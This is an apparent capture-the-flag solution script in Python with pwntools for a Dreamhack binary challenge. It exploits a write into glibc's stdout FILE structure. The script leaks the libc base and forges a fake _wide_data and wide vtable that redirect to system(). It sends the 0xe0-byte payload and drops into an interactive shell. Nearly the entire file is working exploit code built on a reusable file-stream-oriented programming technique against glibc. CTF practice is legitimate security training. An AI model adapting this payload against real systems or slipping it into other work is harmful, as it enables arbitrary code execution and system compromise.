from pwn import *

'''
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("%p\n", _bss_start);
  read(0, _bss_start, 0xE0uLL);
  puts("modify finished!");
  _exit(0);
}
'''

context.binary = elf = ELF('./prob')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 8296".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')

# gdb.attach(p, '''
# b *main+108
# ''')
# pause()

lb = int(rl().strip(), 16) - libc.sym["_IO_2_1_stdout_"] # 0x21a780
stdout = lb + libc.sym["_IO_2_1_stdout_"]
slog("libc_base",  lb)
slog("stdout", stdout)

system = lb + libc.sym["system"]
io_wfile_jumps = lb + libc.sym["_IO_wfile_jumps"]
lock = lb + 0x21ba70
slog("system", system)
slog("_IO_wfile_jumps", io_wfile_jumps)
slog ("_lock", lock)

'''
vtable(오프셋 0xd8): 0x00007c4aed416600
_wide_data(오프셋 0xa0): 0x00007c4aed4199a0
_lock(오프셋 0x88): 0x00007c4aed41ba70
'''
wide_data = stdout - 0x10
fake_wide_vtable = stdout + 0x40

'''
struct _IO_FILE {
    int _flags;              // offset 0x00
    char *_IO_read_ptr;      // offset 0x08
    char *_IO_read_end;      // offset 0x10
    char *_IO_read_base;     // offset 0x18
    char *_IO_write_base;    // offset 0x20
    char *_IO_write_ptr;     // offset 0x28
    char *_IO_write_end;     // offset 0x30
    char *_IO_buf_base;      // offset 0x38
    char *_IO_buf_end;       // offset 0x40
    // ... 
    _IO_lock_t *_lock;       // offset 0x88
    // ... 
    struct _IO_wide_data *_wide_data;  // offset 0xa0 ★
    // ...
};
'''

pay = b''
pay += b'  sh\x00\x00\x00\x00'
pay += p64(0) * 3   
pay += p64(0) # write_base = 0
pay += p64(1) # write_ptr > 0
pay += p64(0) # write_end
pay += p64(0) # buf_base = 0
pay += p64(0) * 8 # 0x40 - 0x78
pay += p64(0) # old_offset
pay += p64(lock) # _lock
pay += p64(0) * 2 # 0x90 - 0x98
pay += p64(wide_data) # # wide_data
pay += p64(system) # doallocate
pay += p64(0) * 4 # 0xb0-0xc8
pay += p64(fake_wide_vtable) # wide_table, with no validations
pay += p64(io_wfile_jumps)

assert len(pay) == 0xe0
slog("pay_len", len(pay))

p.send(pay)
p.interactive()